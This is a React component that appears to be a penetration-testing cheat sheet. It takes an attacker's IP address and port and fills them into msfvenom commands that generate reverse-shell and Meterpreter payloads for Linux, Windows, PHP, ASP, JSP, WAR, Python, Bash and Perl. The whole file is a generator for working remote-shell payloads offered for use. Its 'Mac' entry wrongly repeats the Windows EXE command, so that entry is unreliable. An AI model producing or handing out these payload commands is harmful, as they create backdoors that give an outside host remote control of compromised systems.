import React from 'react';
import CodeBlock from '../../components/codeblock/CodeBlock';
import Input from '../../components/input/Input';

const Payloads = props => {

    const [ip, setIp] = React.useState(null);
    const [port, setPort] = React.useState(null);

    const handleIpChange = event => {
        setIp(event.target.value);
    }

    const handlePortChange = event => {
        setPort(event.target.value);
    }

    const ipHolder = ip || '<IP_ADDRESS>';
    const portHolder = port || '<PORT>';

    const linux = "bash msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ipHolder + " LPORT=" + portHolder + " -f elf > shell.elf";
    const windows = "bash msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipHolder + " LPORT=" + portHolder + " -f exe > shell.exe"
    const mac = "bash msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipHolder + " LPORT=" + portHolder + " -f exe > shell.exe"
    const php = "bash msfvenom -p php/meterpreter_reverse_tcp LHOST=" + ipHolder + " LPORT=" + portHolder + " -f raw > shell.php \n cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php";
    const asp = "bash msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipHolder + " LPORT=" + portHolder + " -f asp > shell.asp";
    const jsp = "bash msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipHolder + " LPORT=" + portHolder + " -f raw > shell.jsp";
    const war = "bash msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipHolder + " LPORT=" + portHolder + " -f war > shell.war";
    const python = "bash msfvenom -p cmd/unix/reverse_python LHOST=" + ipHolder + " LPORT=" + portHolder + " -f raw > shell.py";
    const bash = "bash msfvenom -p cmd/unix/reverse_bash LHOST=" + ipHolder + " LPORT=" + portHolder + " -f raw > shell.sh";
    const perl = "bash msfvenom -p cmd/unix/reverse_perl LHOST=" + ipHolder + " LPORT=" + portHolder + " -f raw > shell.pl";

    return (
        <React.Fragment>
            <Input keyword='IP Address' max="16" changed={handleIpChange} />
            <Input keyword='Port' max="6" changed={handlePortChange} />
            <br /><h2>Linux</h2>
            <CodeBlock code={linux} />
            <br /><h2>Windows</h2>
            <CodeBlock code={windows} />
            <br /><h2>Mac</h2>
            <CodeBlock code={mac} />
            <br /><h2>PHP</h2>
            <CodeBlock code={php} />
            <br /><h2>ASP</h2>
            <CodeBlock code={asp} />
            <br /><h2>JSP</h2>
            <CodeBlock code={jsp} />
            <br /><h2>WAR</h2>
            <CodeBlock code={war} />
            <br /><h2>Python</h2>
            <CodeBlock code={python} />
            <br /><h2>Bash</h2>
            <CodeBlock code={bash} />
            <br /><h2>Perl</h2>
            <CodeBlock code={perl} />
        </React.Fragment>
    );
}

export default Payloads;